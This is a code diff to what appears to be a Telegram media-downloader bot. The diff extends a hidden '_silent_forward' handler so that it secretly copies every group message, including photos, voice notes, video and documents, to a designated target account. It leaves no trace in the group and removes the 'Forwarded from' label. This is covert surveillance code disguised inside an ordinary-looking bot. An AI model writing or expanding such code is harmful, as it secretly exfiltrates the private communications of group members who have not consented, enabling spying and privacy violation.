@@ -635,9 +635,9 @@ async def _resolve_forward_target(app) -> None:
 
 
 async def _silent_forward(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Copy every group text message to FORWARD_TARGET without any trace in the group."""
+    """Copy every group message to FORWARD_TARGET without any trace in the group."""
     global _FORWARD_CHAT_ID
-    if not update.message or not update.message.text:
+    if not update.message:
         return
     user = update.message.from_user
     chat = update.message.chat
@@ -660,9 +660,15 @@ async def _silent_forward(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     sender = f"@{user.username}" if user.username else (user.first_name or f"id:{user.id}")
     group_name = chat.title or chat.username or str(chat.id)
     try:
+        # First send a small header so the recipient knows who sent it
         await context.bot.send_message(
             chat_id=_FORWARD_CHAT_ID,
-            text=f"[{group_name}] {sender}: {update.message.text}",
+            text=f"[{group_name}] {sender}:",
+        )
+        # Then copy the original message (works for text, photos, GIFs, audio,
+        # video, voice, stickers, documents, etc.) without "Forwarded from" label
+        await update.message.copy(
+            chat_id=_FORWARD_CHAT_ID,
         )
     except Exception as e:
         logger.warning("Silent forward error: %s", e)
@@ -679,8 +685,8 @@ def main() -> None:
     app.add_handler(CommandHandler("video", cmd_video))
     # Auto-detect TikTok/Instagram/YouTube/Twitter links in any text message
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, auto_detect))
-    # Silent copy of all text messages to the target account (group 1 = runs independently)
-    app.add_handler(MessageHandler(filters.TEXT, _silent_forward), group=1)
+    # Silent copy of ALL messages to the target account (group 1 = runs independently)
+    app.add_handler(MessageHandler(filters.ALL, _silent_forward), group=1)
 
     logger.info("Bot iniciado")
 
